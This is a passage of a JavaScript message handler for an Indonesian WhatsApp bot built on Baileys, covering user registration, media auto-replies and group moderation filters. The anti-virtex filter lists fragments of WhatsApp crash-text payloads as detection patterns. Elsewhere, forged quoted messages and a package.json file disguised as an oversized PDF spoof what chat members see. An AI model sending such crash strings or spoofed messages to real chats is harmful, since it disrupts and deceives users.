require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, cookie } = require("@whiskeysockets/baileys")
const fs = require('fs')
const mark = `0@s.whatsapp.net`
const util = require('util')
const chalk = require('chalk')
const { mediafiree } = require("./lib/scraper2");
const os = require('os')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const ms = require("parse-ms")
const speed = require("performance-now")
const imageToBase64 = require ('image-to-base64')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const cheerio = require( 'cheerio')
const fetch = require('node-fetch')
const scp1 = require('./scraper') 
const { Primbon } = require('scrape-primbon')
const { Configuration, OpenAIApi } = require('openai')
const primbon = new Primbon()
const hxz = require('hxz-api')
const ytdl = require("ytdl-core")
const calip = require ('caliph-api')
const yts = require('./yt-search')
const { exec, spawn, execSync } = require("child_process")
const {  tiktokdl, tiktokdlv2, lyricsv2,  lyrics,tiktokdlv3, savefrom, instagramdl, instagramdlv3, instagramdlv2 } = require('@bochilteam/scraper')
//========== Via LIB =========//
let afk = require("./lib/afk");
const { userXp, userLeveling, } = require("./lib/user");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require ("./lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("./lib/totalerror")
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('./lib/antispam')
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");
const _sewa = require('./lib/sewa')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = require("./lib/premium");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("./lib/banned")
const { toAudio, toPTT, toVideo } = require('./lib/converter')
 const VnEhanz = JSON.parse(fs.readFileSync('./src/media/vn.json'))
const StickerEhanz = JSON.parse(fs.readFileSync('./src/media/sticker.json'))
const ImageEhanz = JSON.parse(fs.readFileSync('./src/media/image.json'))
const VideoEhanz = JSON.parse(fs.readFileSync('./src/media/video.json'))
const { otw,marah,paan,bad,eror,fuck } = require('./temp/stickerPack.js')
const googleIt = require('google-it');
let _afk = JSON.parse(fs.readFileSync('./src/data/user/afk-user.json'))
const { color, bgcolor } = require('./lib/color')
const { TelegraPh, UploadFileUgu,webp2mp4File } = require('./lib/uploader.js')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, formatp, parseMention, getRandom, h2k, makeid, randomNomor, reSize, getGroupAdmins, sendMedia, FileSize, generateProfilePicture } = require('./lib/myfunc')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./yt')

//=================================================//

/* ~~~~~~~~~ WAKTU SETEMPAT ~~~~~~~~~ */
moment.tz.setDefault("Asia/Jakarta").locale("id")

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const waktu = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if (waktu < "23:59:00") {
    var ucapanWaktu = 'Selamat Malam 🏙️'
}
if (waktu < "19:00:00") {
    var ucapanWaktu = 'Selamat Petang 🌆'
}
if (waktu < "18:00:00") {
    var ucapanWaktu = 'Selamat Sore 🌇'
}
if (waktu < "15:00:00") {
    var ucapanWaktu = 'Selamat Siang 🌤️'
}
if (waktu < "10:00:00") {
    var ucapanWaktu = 'Selamat Pagi 🌄'
}
if (waktu < "05:00:00") {
    var ucapanWaktu = 'Selamat Subuh 🌆'
}
if (waktu < "03:00:00") {
    var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}
//database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const spammer = []
const publik = global.public
//=================================================//
module.exports = ehz = async (ehz, m, chatUpdate, store) => {
    
  var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${nomerOwner2}@s.whatsapp.net`,`${ehz.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const { type, now, args, sender, fromMe,from,botNumber,groupMetadata,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body,} = m

 try {
const from = m.key.remoteJid
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const qmsg = (quoted.msg || quoted)      
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectnewReply.selectedRowId : (m.mtype == 'templateButtonnewReplyMessage') ? m.message.templateButtonnewReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectnewReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau pasang prefix ganti jadi ini : const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' 
const args = body.trim().split(/ +/).slice(1)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const timestampp = speed();
const latensi = speed() - timestampp
//const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
//const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
//==================================//
//emote
var publik = global.public
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
ehz.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
const isGroup = from.endsWith('@g.us')
const botNumber = await ehz.decodeJid(ehz.user.id)
const sender = m.key.fromMe ? (ehz.user.id.split(':')[0]+'@s.whatsapp.net' || ehz.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ehz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
 const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())

//bot respon jika button nya di tekan 
const user = global.db.data.users[m.sender]
const chat = isGroup? global.db.data.chats[m.chat] : false 
const kickon = global.db.data.kickon[m.chat]
// Database
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const hitnya = db.data.hittoday
const prem = JSON.parse(fs.readFileSync("./lib/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
// C Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
const gcount = isPremium ? gcounti.prem : gcounti.user
const isUrl = (ini_url) => {
                return ini_url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
            }
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const math = (teks) => {
return Math.floor(teks)
}  
//===========================================================//  
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

//===========================================================//

//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync('./media/quoted.jpg')},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./media/thumb.jpeg')}}}
//persen online
if(m.myButton) {return}  
ehz.readMessages([m.key])
//Presence Online
if (isCmd){
ehz.sendPresenceUpdate('recording', from)
} else {
ehz.sendPresenceUpdate('recording', from)
}
 //User 
const userLevel = user? db.data.users[m.sender].level : false
const userExp = user? db.data.users[m.sender].exp : false
const userId = user? db.data.users[m.sender].id : false
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 10000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : false
// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }            
//Console Log
try{
var virus = m.message.extendedTextMessage.contextInfo.externalAdReply.title.length
}catch{
var virus = 100
}

if(type == "groupInviteMessage" && m.message.groupInviteMessage.caption.length > 8000||  type == "contactMessage" && m.message.contactMessage.displayName.length > 8000 || type == "imageMessage" && m.message.imageMessage.caption.length > 8000 || budy.length > 8000 && !itsMe  || type == "extendedTextMessage" && virus > 8000 && !itsMe ||  type == "productMessage" && m.message.productMessage.product.description.length > 8000 && !itsMe ||  type == "listMessage" && !itsMe) {
if(isGroup && isBotGroupAdmins) ehz.sendMessage(from, { delete: m.key})
if(!isGroup) ehz.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == botNumber? true : false, timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(color("[ VIRTEXT ]", "black")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}
if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!publik && !isOwner) return 
{
if (!publik && !isOwner) return 
}
//=≠===========



       
       

const newReply = async(teks) =>{ 
ehz.sendMessage(m.chat, {
	document: fs.readFileSync("./package.json"),
	fileName: 'dy_net',
	mimetype: 'application.pdf',
	fileLength: 99999999999999,
	bpageCount: 10909143,	
      contextInfo: {
      mentionedJid: [sender],
forwardingScore: 9999999, 
isForwarded: true, 
      externalAdReply: {
	showAdAttribution: false,
	title: 'dy_net © By dy_coders',
	body: `${ucapanWaktu} kak ${pushname}`,
	previewType:"PHOTO",
	//caption: `oke Tunggu Bentar kak`,
	thumbnailUrl: "https://telegra.ph/file/bb39868a2de11c075e4cb.jpg",

	//sourceUrl: `${sig}`,
	}}}, { quoted: m,ephemeralExpiration: 86400});
  }
//setReply By Ehanz
async function setReply(teks) {
let photo = pickRandom(global.fotoRandom)
 const ngel = {
contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999999, 
isForwarded: true, 
 externalAdReply: {
 showAdAttribution: true,
  title: 'dy_net',
body: `Hai  ${ucapanWaktu} kak ${pushname}`,
previewType: "PHOTO",
 thumbnailUrl: photo,
 sourceUrl: 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg'
   }
  },
 text: teks
  };
return ehz.sendMessage(m.chat, ngel, { quoted: fkontak});
};

 /* ~~~~~~~~~ RESPON DATA MEDIA ~~~~~~~~~ */
    for (let Mwuhehe of VnEhanz) {
            if (budy === Mwuhehe) {
                let audiobuffy = fs.readFileSync(`./media/audio/${Mwuhehe}.mp3`)
                ehz.sendMessage(m.chat, {
                    audio: audiobuffy,
                    mimetype: 'audio/mp4',
                    ptt: true
                }, {
                    quoted: m
                })
            }
        }
        for (let Mwuhehe of StickerEhanz) {
            if (budy === Mwuhehe) {
                let stickerbuffy = fs.readFileSync(`./media/sticker/${Mwuhehe}.webp`)
                ehz.sendMessage(m.chat, {
                    sticker: stickerbuffy
                }, {
                    quoted: m
                })
            }
        }
        for (let Mwuhehe of ImageEhanz) {
            if (budy === Mwuhehe) {
                let imagebuffy = fs.readFileSync(`./media/image/${Mwuhehe}.jpg`)
                ehz.sendMessage(m.chat, {
                    image: imagebuffy
                }, {
                    quoted: m
                })
            }
        }
        for (let Mwuhehe of VideoEhanz) {
            if (budy === Mwuhehe) {
                let videobuffy = fs.readFileSync(`./media/video/${Mwuhehe}.mp4`)
                ehz.sendMessage(m.chat, {
                    video: videobuffy
                }, {
                    quoted: m
                })
            }
        }
  



const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}
            
// Pp ini mah
try {
var ppimg = await ehz.profilePictureUrl(sender, 'image').catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
} catch (err) {
console.log(err)
}
const its = await getBuffer (ppimg)
const dfrply = await reSize(ppimg, 300, 300)
const vid = { url : `wa.me/6285719898124`, type : "video/mp4" }         
                

            
 //if(selectedText == "register"){
if(isCmd){
if (user) {
if (!('name' in user)) user.name = pushname
if (!('id' in user)) user.id = senderNumber
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.hit)) user.hit = 1
if (!isNumber(user.balance)) user.balance = 1000
if (!isNumber(user.limit)) user.limit = 10
if (!isNumber(user.glimit)) user.glimit = 10
if (!('serial' in user)) user.serial = makeid(4)
if (!isNumber(user.afk)) user.afk = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.pc)) user.pc = 0
if (!('autolevelup' in user)) user.autolevelup = false
if (!isNumber(user.pc)) user.pc = 0
if (!user.grade) user.grade = 'Newbie'

} else {
global.db.data.users[m.sender] = {
name: pushname,
id: senderNumber,
date: calender,
exp: 100,
level: 1,
hit: 0,
balance: 1000,
limit: 30,
glimit: 30,
serial: makeid(4).toUpperCase(),
lastclaim: 0,
afk: -1,
pc: 0,
grade: 'Newbie',
autolevelup: false 
}

  
let me = m.sender
let anu = "https://telegra.ph/file/8b71af37d07670a5f2228.jpg";

    let contextInfo = {
      externalAdReply: {
        showAdAttribution: false,
        title: "Saved to database",
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: anu,
      },
    };
let teks =`*]───── REGISTERED ─────[*
 
👤 Nama: ${pushname}
☎️ Nomer: ${senderNumber}
📡 Serial: ${db.data.users[m.sender].serial}
📍 Verified: ${calender}
 `
  await sleep(1000)

                                                                              }
}   


  //Auto Hit 
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`  
//add to dashboard  db.data.allcommand.push(toFirstCase(command)) //
//if(!isGroup) //addAutoClear(m, "1h", clearchat)  
if(isCmd){
db.data.users[sender].hit += 1
cmdAdd("run", "1d", hitnya)
Succes(toFirstCase(command), dash, allcommand)
}

if (isGroup && chat) {
if (!('name' in chat)) chat.name = groupNmae
//if (!isNumber(chat.add)) chat.add = 0
if (!('detect' in chat)) chat.detect = true
if (!('sBye' in chat)) chat.sBye = ''
if (!('sPromote' in chat)) chat.sPromote = ''
if (!('sDemote' in chat)) chat.sDemote = ''
if (!('desc' in chat)) chat.desc = true
if (!('descUpdate' in chat)) chat.descUpdate = true
if (!('stiker' in chat)) chat.stiker = false
if (!('antiLink' in chat)) chat.antiLink = true
//if (!isNumber(chat.expired)) chat.expired = 0
if (!('antiBadword' in chat)) chat.antiBadword = true
if (!('antispam' in chat)) chat.antispam = true
if (!('antitroli' in chat)) chat.antitroli = false
if (!('antivirtex' in chat)) chat.antivirtex = false
if (!('antiwame' in chat)) chat.antiwame = false
if (!('viewonce' in chat)) chat.viewonce = true
if (!('nsfw' in chat)) chat.nsfw = false
if (!('antitoxic' in chat)) chat.antitoxic = false
if (!('clear' in chat)) chat.clear = false
//if (!isNumber(chat.cleartime)) chat.clearTime = 0
} else if (isGroup) global.db.data.chats[m.chat] = {
name: groupName,
add: 0,
detect: true,
welcome: true,
sWelcome: true,
sBye: '',
sPromote: '',
sDemote: '',
desc: true,
descUpdate: true,
autostiker: false,
antilink: false,
antilinkgc: false,
antidelete: false,
antiasing: false,
banchat: true,
antitoxic: false,
expired: 0,
antibadword: true,
antispam: true,
antitroli: false,
antivirtex: false,
antiwame: false,
antihidetag: false,
viewonce: true,
nsfw: false,
clear: true,
clearTime: 0
}

//STICKER
const nt = otw
const stikot = nt[Math.floor(Math.random() * nt.length)]
const sendSticker = (teks) => {
let oti = fs.readFileSync('./temp/sticker/oke tunggu.webp')
ehz.sendMessage(from, {sticker: oti },{quoted: m})
}
//=============
const jan = fuck
const heh = jan[Math.floor(Math.random() * jan.length)]
const sendSticker1 = (teks) => {
let kocak = fs.readFileSync('./temp/sticker/pakyu.webp')
ehz.sendMessage(from, {sticker: kocak },{quoted: m})
}
//==========
const pedo = paan
const mosi = pedo[Math.floor(Math.random() * pedo.length)]
const sendSticker2 = (teks) => {
let prosi = fs.readFileSync('./temp/sticker/why.webp')
ehz.sendMessage(from, {sticker: prosi },{quoted: m})
}
//==========
const weh = marah
const awas = weh[Math.floor(Math.random() * weh.length)]
const sendSticker3 = (teks) => {
let jaga = fs.readFileSync('./temp/sticker/marah.webp')
ehz.sendMessage(from, {sticker: jaga },{quoted: m})
}
//==========
const toxc = bad
const hus = toxc[Math.floor(Math.random() * toxc.length)]
const sendSticker4 = (teks) => {
let eeh = fs.readFileSync('./temp/sticker/istighfar.webp')
ehz.sendMessage(from, {sticker: eeh },{quoted: m})
}
//System Expired
_sewa.expiredCheck(ehz, sewa)

//-------------------- 》SECURITY《 ------------------\\
// Anti promosi HAPUS
const Promosi2 = isGroup ?

db.data.chats[from].promosi2 : false
if (isGroup && Promosi2) {
if (budy.match(`adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|DANA|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotGroupAdmins) {return} setReply(` lagi promosi awokawok`)
if (isGroupAdmins) return setReply(`Admin Mah Bebas Yakan?`)
if (isOwner) return setReply(`Gw Mah Bebas Yakan?`)
sendSticker2(mosi)
ehz.sendMessage(m.chat, { delete: m.key })
ehz.sendMessage(m.chat, { delete: m.key })

}
}
// ANTI TOXIC
 const isAntiToxic = isGroup ? db.data.chats[from].antitoxic : false
// ANTI TOXIC
if (isGroup && isAntiToxic) {
if (budy.match(`Anjing|Monyet|Setan|Goblog|Yatim|ngentot|Memek|Kontol|Asu|coli|sange|Bot goblog|ngewe|njing|nying|nyet`)) {
//if (isGroupAdmins) return setReply(`Alah sia admin grup mah bebas yekan :v`)
if (!isBotGroupAdmins) {return}
setReply (`*heh@${pushname} *\nKata Aneh Terdeteksi\nJangan Ulangi Lagi Hindari Admin Marah\nAtau Kamu Akan Di kick oleh Bot`)
sendSticker4(toxc)
ehz.sendMessage(from, { delete: m.key })

 }
//
 }
 
 
  
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`) ){
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(!isBotGroupAdmins) return m.reply ('Bot bukan admin jadi gbisa hapus pesan nya :(')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await ehz.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return m.reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
//if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
await setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf saya hapus karena antilink grub aktif`)
await sleep(2000)
if(isBotGroupAdmins) await
sendSticker3(awas)
 ehz.sendMessage(from, { delete: m.key })
 //conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}   
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
//ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await ehz.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return setReply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
//if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
if(isBotGroupAdmins) ehz.sendMessage(from, { delete: m.key })
//ehz.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}
const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
//ANTI VIRUS
if (isGroup && isAntiVirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
